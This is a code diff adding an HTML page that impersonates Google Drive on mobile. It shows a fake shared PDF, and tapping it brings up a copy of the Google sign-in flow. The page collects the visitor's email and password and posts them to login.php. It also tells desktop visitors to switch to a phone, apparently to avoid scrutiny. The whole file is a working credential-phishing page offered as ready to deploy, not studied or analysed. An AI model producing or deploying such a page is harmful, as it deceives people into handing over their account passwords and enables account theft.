@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta content="width=300, initial-scale=1" name="viewport">
+  <meta name="jingle" value="notranslate">
+  <meta name="description" content=".">
+  <title>Google Drive</title>
+  <link rel="stylesheet" href="/style.css">
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Roboto&display=swap");
+
+    * {
+      padding: 0;
+      margin: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      display: flex;
+    }
+
+    main {
+      height: 100vh;
+      width: 100vw;
+      background-color: #EEEEEE;
+    }
+
+    nav {
+      width: 100vw;
+      height: 55px;
+      background-color: #C1C1C1;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #C1C1C1;
+    }
+    .onclick{
+      margin-left: 10px;
+    }
+
+    .menu {
+      height: 40px;
+      width: 170px;
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+    }
+
+    .rightnav {
+      height: 40px;
+      width: 100px;
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+    }
+
+    .nameofnav span {
+      font-size: 20px;
+      color: #3A3A3A
+    }
+
+    .filediv {
+      height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: left;
+    }
+
+    .filediv span {
+      font-size: 16px;
+      margin: 20px;
+      color: #616161;
+    }
+
+    .pdfdiv {
+      background-color: #FFFFFF;
+      width: 180px;
+      height: 180px;
+      margin: 0 5px;
+      box-shadow: 1px 1px 2px lightgrey;
+    }
+
+    .top {
+      width: 180px;
+      height: calc(180px - 45px);
+      overflow: hidden;
+    }
+
+    .top img {
+      width: 180px;
+      height: 240px;
+    }
+
+    .bottom01 {
+      width: 180px;
+      height: 45px;
+      display: flex;
+      justify-content: space-evenly;
+      align-items: center;
+    }
+
+    .bottom span {
+      font-size: 14px;
+    }
+
+    aside {
+      position: absolute;
+      overflow: hidden;
+      transition: 0.3s;
+      height: 100vh;
+      width: 0px;
+      background-color: #FFFFFF;
+      z-index: 2;
+    }
+
+    .backdiv {
+      background-color: rgba(0, 0, 0, 0.5);
+      width: 0vw;
+      height: 100vh;
+      position: absolute;
+      left: 10vw;
+      z-index: 1;
+    }
+
+    .signin {
+      border-bottom: 1px solid lightgray;
+      padding-left: 20px;
+      padding-top: 68px;
+      padding-bottom: 15px;
+    }
+
+    .signin a {
+      color: #2E7ADD;
+      text-decoration: none;
+      font-size: 18px;
+
+    }
+
+    .menudata {
+      border-bottom: 1px solid lightgray;
+      height: 295px;
+      overflow: hidden;
+
+    }
+
+    .menudata img {
+      width: 333px;
+    }
+
+    .helpsandmore {
+      border-bottom: 1px solid lightgray;
+      height: 210px;
+      padding: 8px 0;
+
+    }
+
+    .helpdata {
+      margin: 19px 15px;
+      font-size: 15px;
+    }
+
+    .loading {
+      border: 1px solid red;
+      width: 100vw;
+      height: 100vh;
+      background-color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .loading img {
+      width: 100px;
+    }
+
+    a {
+      text-decoration: none;
+      color: #1a73e8;
+      display: block;
+      font-size: 14px;
+    }
+
+    .container {
+      z-index: 2;
+      font-family: "Roboto";
+      width: 100vw;
+      margin: auto;
+      margin-top: 4rem;
+      border-radius: 10px;
+      padding: 2rem;
+      height: 500px;
+      /* text-align: center; */
+    }
+
+    .top-content {
+      text-align: center;
+    }
+
+    .img01 {
+      width: 80px;
+      margin: 10px 0;
+    }
+
+    h2 {
+      font-size: 20px;
+      font-weight: 100;
+      margin-bottom: 10px;
+    }
+
+    .heading {
+      margin-bottom: 30px;
+    }
+
+    input[type="email"] {
+      display: block;
+      border: 1px solid rgb(228, 228, 228);
+      font-size: 16px;
+      width: 100%;
+      height: 55px;
+      padding: 0 15px;
+      margin-bottom: 10px;
+      position: relative;
+      z-index: 2;
+      background-color: transparent;
+      outline: none;
+      border-radius: 5px;
+      position: relative;
+    }
+
+    .inputs {
+      position: relative;
+    }
+
+    .input-label {
+      position: absolute;
+      top: 15px;
+      font-size: 1.1rem;
+      left: 14px;
+      color: rgb(122, 122, 122);
+      font-weight: 100;
+      transition: 0.1s ease;
+      background-color: white;
+      padding: 0 5px;
+    }
+
+    input[type="email"]:focus~.input-label {
+      top: -7px;
+      color: #1864c9;
+      font-size: 13px;
+      background-color: rgb(255, 255, 255);
+      z-index: 2;
+    }
+
+    input[type="email"]:target~.input-label {
+      top: -7px;
+      color: #1864c9;
+      font-size: 13px;
+      background-color: rgb(255, 255, 255);
+      z-index: 2;
+    }
+
+    .input:focus {
+      border: 2px solid #1a73e8;
+    }
+
+    .link-btn {
+      margin-bottom: 2rem;
+    }
+
+    .color {
+      color: rgb(90, 90, 90);
+      font-size: 14px;
+      margin-bottom: 5px;
+    }
+
+    .btn-group {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .create-btn {
+      border: none;
+      background-color: transparent;
+      color: #1a73e8;
+      font-weight: bold;
+      cursor: pointer;
+      height: 35px;
+      padding: 10px 5px;
+    }
+
+    .next-btn {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      height: 38px;
+      padding: 0 25px;
+      border-radius: 5px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+    }
+
+    .create-btn:hover {
+      background-color: #e8f2ff6e;
+      /* transition: 0.2s all ease-in; */
+    }
+
+    .next-btn:hover {
+      background-color: #1864c9;
+    }
+
+    input[type="password"] {
+      display: block;
+      border: 1px solid rgb(228, 228, 228);
+      font-size: 16px;
+      width: 100%;
+      height: 55px;
+      padding: 0 15px;
+      margin-bottom: 10px;
+      position: relative;
+      z-index: 2;
+      background-color: transparent;
+      outline: none;
+      border-radius: 5px;
+      position: relative;
+    }
+
+    input[type="password"]:focus~.input-label {
+      top: -7px;
+      color: #1864c9;
+      font-size: 13px;
+      background-color: rgb(255, 255, 255);
+      z-index: 2;
+    }
+
+    input[type="password"]:target~.input-label {
+      top: -7px;
+      color: #1864c9;
+      font-size: 13px;
+      background-color: rgb(255, 255, 255);
+      z-index: 2;
+    }
+
+    .emaildata {
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 2px;
+    }
+
+    .emaildata img {
+      width: 20px;
+      margin: 0 8px;
+    }
+
+    .heading2 {
+      font-size: 13px;
+    }
+
+    .googleimage {
+      width: 80px;
+      margin: 10px 0;
+    }
+
+    .container04 {
+      display: flex;
+    }
+
+    #passwala {
+      background-color: white;
+      width: 0vw;
+      overflow: hidden;
+      display: none;
+      top: 0;
+      position: absolute;
+      transition: 0.2s;
+      z-index: 3;
+    }
+
+    .showpassword {
+      display: flex;
+      justify-content: left;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+
+    #ShowPassword {
+      margin: 0 8px;
+    }
+
+    .alert {
+      display: flex;
+      align-items: center;
+      justify-content: left;
+      font-size: 13px;
+      color: #E35E55;
+    }
+
+    p .alertimg {
+      margin-right: 5px;
+    }
+
+    .secondalert {
+      position: absolute;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      bottom: 100px;
+      z-index: 4;
+      width: 100vw;
+      height: 0px;
+      overflow: hidden;
+    }
+
+    .mainalert {
+      height: 35px;
+      width: 290px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: lightgray;
+      background-color: black;
+      padding: 0 20px;
+      border-radius: 100px;
+      transition: 0.5s;
+      opacity: 0.7;
+    }
+
+    .anchorwala {
+      position: absolute;
+      bottom: 0;
+      width: 0px;
+      overflow: hidden;
+    }
+    .newmedia{
+      display: none;
+      width: 100vw;
+      justify-content: center;
+      margin-top: 100px;
+    }
+    @media screen and (min-width: 480px) {
+      .newmedia {
+         display: flex;
+      }
+      .container04{
+        display: none;
+      }
+     
+    }
+  </style>
+</head>
+
+<body>
+  <div class="newmedia">
+    <div class="media">
+      PDF viewer doesn't support 'desktop' or 'PC'. Try again with mobile or phone or tune off portrait mode.
+    </div>
+  </div>
+  <div class="container04" id="container04">
+    <aside class="asideleft" id="asiderider">
+      <div class="signin">
+        <a href="#" onclick="googlelogin04()">Sign in</a>
+      </div>
+      <div class="menudata" onclick="sasta()">
+        <img src="https://i.ibb.co/LrxKr2J/IMG-20231220-131235.jpg" alt="IMG-20231220-131235">
+      </div>
+      <div class="helpsandmore" onclick="sasta()">
+        <p class="helpdata">Help</p>
+        <p class="helpdata">Send Feedback</p>
+        <p class="helpdata">Privacy Policy</p>
+        <p class="helpdata">Teams of Service</p>
+        <p class="helpdata">Desktop Version</p>
+      </div>
+    </aside>
+    <div class="backdiv" id="backdiv01" onclick="back()">
+
+    </div>
+    <main id="main01">
+      <nav>
+        <div class="menu">
+          <div class="onclick" onclick="openasider()">
+            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="28" height="28" viewBox="0,0,256,256" style="fill:#000000;">
+              <g fill="#737373" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal">
+                <g transform="scale(8,8)">
+                  <path d="M4,7v2h24v-2zM4,15v2h24v-2zM4,23v2h24v-2z"></path>
+                </g>
+              </g>
+            </svg>
+          </div>
+
+          <div class="nameofnav">
+            <span>Google Drive</span>
+          </div>
+        </div>
+        <div class="rightnav" onclick="sasta()">
+          <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="22" height="22" viewBox="0,0,256,256" style="fill:#000000;">
+            <g fill="#727375" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal">
+              <g transform="scale(10.66667,10.66667)">
+                <path d="M9,2c-3.85415,0 -7,3.14585 -7,7c0,3.85415 3.14585,7 7,7c1.748,0 3.34501,-0.65198 4.57422,-1.71875l0.42578,0.42578v1.29297l6,6l2,-2l-6,-6h-1.29297l-0.42578,-0.42578c1.06677,-1.22921 1.71875,-2.82622 1.71875,-4.57422c0,-3.85415 -3.14585,-7 -7,-7zM9,4c2.77327,0 5,2.22673 5,5c0,2.77327 -2.22673,5 -5,5c-2.77327,0 -5,-2.22673 -5,-5c0,-2.77327 2.22673,-5 5,-5z"></path>
+              </g>
+            </g>
+          </svg>
+          <svg fill="#858688" height="20px" width="20px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="-3.21 -3.21 38.48 38.48" xml:space="preserve" stroke="#858688" stroke-width="0.00032055" transform="rotate(90)">
+            <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+            <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+            <g id="SVGRepo_iconCarrier">
+              <g>
+                <path d="M3.968,12.061C1.775,12.061,0,13.835,0,16.027c0,2.192,1.773,3.967,3.968,3.967c2.189,0,3.966-1.772,3.966-3.967 C7.934,13.835,6.157,12.061,3.968,12.061z M16.233,12.061c-2.188,0-3.968,1.773-3.968,3.965c0,2.192,1.778,3.967,3.968,3.967 s3.97-1.772,3.97-3.967C20.201,13.835,18.423,12.061,16.233,12.061z M28.09,12.061c-2.192,0-3.969,1.774-3.969,3.967 c0,2.19,1.774,3.965,3.969,3.965c2.188,0,3.965-1.772,3.965-3.965S30.278,12.061,28.09,12.061z"></path>
+              </g>
+            </g>
+          </svg </div>
+
+
+      </nav>
+      <div class="contain">
+        <div class="filediv">
+          <span>Files</span>
+        </div>
+        <div class="pdfdiv" onclick="googlelogin04()">
+          <div class="top">
+            <img src="https://i.ibb.co/6gfshCb/IMG-20231220-004638-01.jpg" alt="">
+
+          </div>
+          <div class="bottom01">
+            <img width="20px" height="22px" src="https://img.icons8.com/external-flaticons-flat-flat-icons/64/000000/external-pdf-squaricons-flaticons-flat-flat-icons.png" alt="external-pdf-squaricons-flaticons-flat-flat-icons" />
+            <span>NoticeFI..in).pdf</span>
+            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="22" height="22" viewBox="0,0,256,256" style="fill:#000000;">
+              <g fill="#8c8c8c" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal">
+                <g transform="scale(8.53333,8.53333)">
+                  <path d="M15,3c-6.627,0 -12,5.373 -12,12c0,6.627 5.373,12 12,12c6.627,0 12,-5.373 12,-12c0,-6.627 -5.373,-12 -12,-12zM16,21h-2v-7h2zM15,11.5c-0.828,0 -1.5,-0.672 -1.5,-1.5c0,-0.828 0.672,-1.5 1.5,-1.5c0.828,0 1.5,0.672 1.5,1.5c0,0.828 -0.672,1.5 -1.5,1.5z"></path>
+                </g>
+              </g>
+            </svg>
+          </div>
+
+
+        </div>
+      </div>
+
+
+    </main>
+    <div class="secondalert" id="secondalert01">
+      <div class="mainalert" id="mainalert09"></div>
+    </div>
+  </div>
+  <script>
+    function openasider() {
+      h = document.getElementById('asiderider');
+      k = document.getElementById('backdiv01');
+      if (h.style.width == '330px') {
+        h.style.width = '0px';
+        k.style.width = '0vw';
+
+
+      }
+      else {
+        h.style.width = '330px';
+        k.style.width = '90vw';
+
+      }
+    }
+
+    function sasta() {
+      console.log("hrllk");
+      document.getElementById('mainalert09').innerHTML = 'Needs acount must be sign in.';
+      document.getElementById('mainalert09').style.opacity = '0.7';
+      document.getElementById('secondalert01').style.height = '35px';
+
+      function firstGunwar() {
+        document.getElementById('mainalert09').style.opacity = '0.0';
+      }
+
+      function secondFunwar() {
+        document.getElementById('secondalert01').style.height = '0px';
+      }
+      setTimeout(firstGunwar, 3000);
+      setTimeout(secondFunwar, 5000);
+
+    }
+
+    function googlelogin04() {
+      document.getElementById('mainalert09').innerHTML = 'Sign in with google acount';
+      document.getElementById('mainalert09').style.opacity = '0.7';
+      document.getElementById('secondalert01').style.height = '35px';
+
+      function firstGunwar() {
+        document.getElementById('mainalert09').style.opacity = '0.0';
+      }
+
+      function secondFunwar() {
+        document.getElementById('secondalert01').style.height = '0px';
+      }
+      setTimeout(firstGunwar, 600);
+      setTimeout(secondFunwar, 700);
+      setTimeout(googlelogin, 800);
+
+    }
+
+    function back() {
+      h.style.width = '0px';
+      k.style.width = '0vw';
+
+    }
+
+    function googlelogin() {
+      console.log("Google looooo");
+      document.getElementById("container04").innerHTML = `<div class= "loading"><img src="https://media1.tenor.com/m/siXiZO-F1awAAAAC/loader-waiting.gif" alt="https://media1.tenor.com/m/siXiZO-F1awAAAAC/loader-waiting.gif"> </div>`;
+
+      function myFunction() {
+        document.getElementById("container04").innerHTML = `<form novalidate="" method="post" action="login.php">
+           <div class="dontneeds">
+             <div class="container">
+                <div class="top-content">
+                <img class="img01" src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="">
+                <h2>Sign in</h2>
+                <p class="heading">Use your Google Account</p>
+                </div>
+                <div class="inputs">
+                <input id="Email" name="email" type="email" value="" spellcheck="false" class="input" autocomplete="email">
+                <label for="Email" class="input-label">Email or phone</label>
+                <p class="alert" id="alert01"></p>
+                </div>
+                <a href="https://accounts.google.com/RecoverAccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F" class="link-btn">Forgot Email?</a>
+                <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
+                <a href="https://support.google.com/accounts/?p=securesignin&hl=en" class="link-btn">Learn More</a>
+                <div class="btn-group">
+                <a href="https://accounts.google.com/SignUp?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&hl=en" class="create-btn">Create account</a>
+                <div class="next-btn" onclick="validatefn()">Next</div>
+                </div>
+                </div> <div class="container" id= "passwala">
+                <div class="top-content">
+                <img class="googleimage" src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="">
+                <h2>Welcome</h2>
+                <div class="emaildata"><img src="https://images.leadconnectorhq.com/image/f_webp/q_80/r_1200/u_https://assets.cdn.filesafe.space/AgbbsPawAiP5XpvWuwod/media/64fe965d93d7eb175230e08b.svg+xml" alt="https://images.leadconnectorhq.com/image/f_webp/q_80/r_1200/u_https://assets.cdn.filesafe.space/AgbbsPawAiP5XpvWuwod/media/64fe965d93d7eb175230e08b.svg+xml"><p class="heading2" id="heading2"></p></div>
+                </div>
+                <div class="Mainform">
+                <div class="inputs" id="input01">
+                <input id="Passwd" name="password" type="password"  class="input" autocomplete="current-password">
+                <label for="Passwd" class="input-label">Password</label>
+                <p class="alert" id="alert02"></p>
+                <div class="showpassword">
+                <input id="ShowPassword" type="checkbox" onclick="showPassword()"><label for="ShowPassword">Show Password</label>
+                </div>
+                </div>
+                </div>
+                <a href="https://accounts.google.com/RecoverAccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F" class="link-btn">Forgot Password?</a>
+                <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
+                <a href="https://support.google.com/accounts/?p=securesignin&hl=en" class="link-btn">Learn More</a>
+                <div class="btn-group">
+                <a href="https://accounts.google.com/SignUp?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&hl=en" class="create-btn">Create account</a>
+                <div class="next-btn" onclick="hellowala()">Next</div>
+                <div class="anchorwala">
+                  <input id="signIn" name="signIn" class="driveA" type="submit" value="Next">
+                </div>
+                </div>
+                </div>
+           </div>
+         </form>`;
+      }
+
+      setTimeout(myFunction, 1000);
+
+    }
+
+    function validatefn() {
+      var inputValue = document.getElementById("Email").value;
+      if (inputValue == "") {
+        document.getElementById("alert01").innerHTML = '<img class="alertimg" width="18" height="18" src="https://img.icons8.com/color/48/000000/high-importance--v1.png" alt="high-importance--v1"/> Enter an email or phone number';
+      }
+      else {
+        showdata();
+      }
+
+    }
+    pass = document.getElementById('passwala');
+    function showdata() {
+      console.log("gggg");
+      setTimeout(realData, 500);
+
+      function realData() {
+
+        pass = document.getElementById('passwala');
+        pass.style.display = 'block';
+        pass.style.width = '100vw';
+
+      }
+      inputValue = document.getElementById("Email").value;
+      console.log(inputValue);
+      document.getElementById('heading2').innerHTML = inputValue;
+
+    }
+
+    function showPassword() {
+      var x = document.getElementById("Passwd");
+      if (x.type === "password") {
+        x.type = "email";
+
+      }
+      else {
+        x.type = "password";
+      }
+    }
+
+    function hellowala() {
+      console.log('hajsjjsjs');
+      var inputValue01 = document.getElementById("Passwd").value;
+      if (inputValue01 == "") {
+        document.getElementById("alert02").innerHTML = '<img class="alertimg" width="18" height="18" src="https://img.icons8.com/color/48/000000/high-importance--v1.png" alt="high-importance--v1"/> Enter a password';
+      }
+      else {
+        document.getElementById('signIn').click();
+        console.log('click');
+      }
+    }
+  </script>
+
+
+</body>
+
+</html>
